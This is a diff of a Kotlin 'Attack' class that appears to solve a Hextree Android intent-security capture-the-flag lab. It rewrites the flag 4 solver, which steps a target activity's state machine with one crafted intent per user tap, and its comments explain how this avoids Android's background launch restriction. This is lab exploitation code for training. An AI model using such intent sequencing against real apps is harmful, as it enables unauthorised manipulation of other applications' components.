@@ -70,32 +70,42 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 
 	/**
 	 * FLAG 4 - State Machine Exploitation
-	 * Technique: Sequential Intent Sending
-	 * Target activity implements a state machine (INIT→PREPARE→BUILD→GET_FLAG→success).
-	 * We send intents in correct order with matching actions to advance each state.
-	 * Delay between intents ensures each state transition completes before next.
+	 * Technique: User-triggered sequential intents (one real tap per transition)
+	 *
+	 * Flow:
+	 * 1. Each button tap fires exactly ONE intent with the next required action
+	 * 2. INIT -> PREPARE -> BUILD -> GET_FLAG -> success() (any action triggers it)
+	 * 3. currentStateIndex cycles through the actions list on every tap
+	 *
+	 * Key insight: Handler.postDelayed() breaks this because Android's background
+	 * activity launch restriction blocks startActivity() calls that fire after your
+	 * app has already lost foreground (which happens right after the 1st intent).
+	 * A real onClick() is always exempt from that restriction - every tap IS a fresh,
+	 * legitimate user gesture, so there's no timing window to gamble against.
 	 */
+
+	private val actions = arrayOf(
+		"PREPARE_ACTION",   // INIT -> PREPARE
+		"BUILD_ACTION",     // PREPARE -> BUILD
+		"GET_FLAG_ACTION",  // BUILD -> GET_FLAG
+		"ANY_ACTION"        // GET_FLAG -> success() (any action triggers it)
+	)
+
+	private var currentStateIndex = 0
+
 	fun flag4() {
 		val activityPath = "$packageName.activities.Flag4Activity"
 
-		val customActions = listOf(
-			"PREPARE_ACTION",   // INIT -> PREPARE
-			"BUILD_ACTION",     // PREPARE -> BUILD
-			"GET_FLAG_ACTION",  // BUILD -> GET_FLAG
-			null                // GET_FLAG -> success() (auto triggers on any intent)
-		)
-
-		customActions.forEachIndexed { i, action ->
-			val intent = Intent()
-			intent.setClassName(packageName, activityPath)
-			intent.action = action
-			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-
-			Handler(Looper.getMainLooper()).postDelayed({
-				Utils.dumpIntent(context, intent, title = "Flag 4 Intent $i")
-				context.startActivity(intent)
-			}, i * 500L)
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			action = actions[currentStateIndex]
+			addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
 		}
+
+		Utils.dumpIntent(context, intent, title = "Flag 4 Intent ($currentStateIndex)")
+		context.startActivity(intent)
+
+		currentStateIndex = (currentStateIndex + 1) % actions.size
 	}
 
 	/**
@@ -419,6 +429,7 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		}
 		activity.startActivityForResult(intent, 331)
 	}
+
 	/**
 	 * FLAG 34 - Simple File Provider
 	 * Technique: FileProvider URI access via "filename" extra
